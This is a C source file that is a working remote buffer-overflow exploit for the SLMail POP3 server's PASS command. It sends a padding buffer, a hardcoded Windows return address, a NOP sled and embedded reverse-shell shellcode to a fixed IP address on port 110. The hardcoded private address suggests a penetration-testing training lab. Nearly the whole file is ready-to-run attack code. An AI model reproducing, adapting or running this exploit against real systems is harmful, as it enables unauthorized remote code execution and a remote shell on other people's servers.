#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <errno.h>
#include <netinet/in.h>
#include <netdb.h>
#include <string.h>
 
//#define retadd "\x8f\x35\x4a\x5f" /*win2k server sp4 0x773a459f*/
#define retadd "\x8f\x35\x4a\x5f"
#define port 110

/* revshell */
unsigned char shellcode[] = 
"\xb8\xbd\x95\xbc\x9d\xdb\xcf\xd9\x74\x24\xf4\x5f\x33\xc9\xb1"
"\x52\x31\x47\x12\x03\x47\x12\x83\x52\x69\x5e\x68\x50\x7a\x1d"
"\x93\xa8\x7b\x42\x1d\x4d\x4a\x42\x79\x06\xfd\x72\x09\x4a\xf2"
"\xf9\x5f\x7e\x81\x8c\x77\x71\x22\x3a\xae\xbc\xb3\x17\x92\xdf"
"\x37\x6a\xc7\x3f\x09\xa5\x1a\x3e\x4e\xd8\xd7\x12\x07\x96\x4a"
"\x82\x2c\xe2\x56\x29\x7e\xe2\xde\xce\x37\x05\xce\x41\x43\x5c"
"\xd0\x60\x80\xd4\x59\x7a\xc5\xd1\x10\xf1\x3d\xad\xa2\xd3\x0f"
"\x4e\x08\x1a\xa0\xbd\x50\x5b\x07\x5e\x27\x95\x7b\xe3\x30\x62"
"\x01\x3f\xb4\x70\xa1\xb4\x6e\x5c\x53\x18\xe8\x17\x5f\xd5\x7e"
"\x7f\x7c\xe8\x53\xf4\x78\x61\x52\xda\x08\x31\x71\xfe\x51\xe1"
"\x18\xa7\x3f\x44\x24\xb7\x9f\x39\x80\xbc\x32\x2d\xb9\x9f\x5a"
"\x82\xf0\x1f\x9b\x8c\x83\x6c\xa9\x13\x38\xfa\x81\xdc\xe6\xfd"
"\xe6\xf6\x5f\x91\x18\xf9\x9f\xb8\xde\xad\xcf\xd2\xf7\xcd\x9b"
"\x22\xf7\x1b\x0b\x72\x57\xf4\xec\x22\x17\xa4\x84\x28\x98\x9b"
"\xb5\x53\x72\xb4\x5c\xae\x15\xb1\xab\xb0\x2f\xad\xa9\xb0\xae"
"\x95\x27\x56\xda\xf9\x61\xc1\x73\x63\x28\x99\xe2\x6c\xe6\xe4"
"\x25\xe6\x05\x19\xeb\x0f\x63\x09\x9c\xff\x3e\x73\x0b\xff\x94"
"\x1b\xd7\x92\x72\xdb\x9e\x8e\x2c\x8c\xf7\x61\x25\x58\xea\xd8"
"\x9f\x7e\xf7\xbd\xd8\x3a\x2c\x7e\xe6\xc3\xa1\x3a\xcc\xd3\x7f"
"\xc2\x48\x87\x2f\x95\x06\x71\x96\x4f\xe9\x2b\x40\x23\xa3\xbb"
"\x15\x0f\x74\xbd\x19\x5a\x02\x21\xab\x33\x53\x5e\x04\xd4\x53"
"\x27\x78\x44\x9b\xf2\x38\x74\xd6\x5e\x68\x1d\xbf\x0b\x28\x40"
"\x40\xe6\x6f\x7d\xc3\x02\x10\x7a\xdb\x67\x15\xc6\x5b\x94\x67"
"\x57\x0e\x9a\xd4\x58\x1b";

struct sockaddr_in plm,lar,target;
 
int conn(char *ip)
{
 int sockfd;
 plm.sin_family = AF_INET;
 plm.sin_port = htons(port);
 plm.sin_addr.s_addr = inet_addr(ip);
 bzero(&(plm.sin_zero),8);
 sockfd = socket(AF_INET,SOCK_STREAM,0);
if((connect(sockfd,(struct sockaddr *)&plm,sizeof(struct sockaddr))) < 0)
{
 perror("[-] connect error!");
 exit(0);
}
 printf("[*] Connected to: %s.\n",ip);
 return sockfd;
}
 
int main(int argc, char *argv[])
{
    int xs;
    char out[1024];
    char *buffer = malloc(3500);
    memset(buffer, 0x00, 3500);
    char *off = malloc(2606);
    memset(off, 0x00, 2606);
    memset(off, 0x41, 2606);
    char *nop = malloc(16);
    memset(nop, 0x00,16);
    memset(nop, 0x90,16);




    strcat(buffer, off);
    strcat(buffer, retadd);
    strcat(buffer, nop);
    strcat(buffer, shellcode);

    printf("[+] SLMAIL Remote buffer overflow exploit in POP3 PASS fixed by blacksignals.\n");
    xs = conn("10.11.4.94");
    read(xs, out, 1024);
    printf("[*] %s", out);
    write(xs,"USER username\r\n", 15);
    read(xs, out, 1024);
    printf("[*] %s", out);
    write(xs,"PASS ",5);
    write(xs,buffer,strlen(buffer));
    printf("Shellcode len: %d bytes\n",strlen(shellcode));
    printf("Buffer len: %d bytes\n",strlen(buffer));
    write(xs,"\r\n",4);
    close(xs);  
}